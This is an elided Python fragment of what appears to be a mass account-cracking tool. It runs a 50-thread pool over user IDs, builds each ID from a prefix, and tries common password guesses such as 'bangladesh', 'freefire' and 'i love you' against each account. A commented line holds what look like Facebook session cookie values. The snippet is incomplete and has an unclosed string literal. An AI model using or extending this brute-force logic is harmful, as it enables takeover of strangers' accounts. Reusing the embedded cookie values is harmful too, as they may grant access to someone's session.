...
def innocent():
    ...
    with ThreadPool(max_workers=50) as ahare:
        ...
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh','Bangladesh','freefire','i love you','free fire','sadiya]
            uid = code+fuck
...
def mumitx(uid,pwx,tl):
    ...
    # 'cookie': 'datr=jWW5ZGAX-B7NAu-i93cOCqji; sb=V3i5ZHZ8X8I5KiQuV-itq5ok; dpr=2.4750001430511475; m_pixel_ratio=2.4750001430511475; wd=437x857; fr=0kK4Ev4ZycM8ULdYS..BkuWWN.pl.AAA.0.0.BkuZB7.AWWhsqaiF-U',
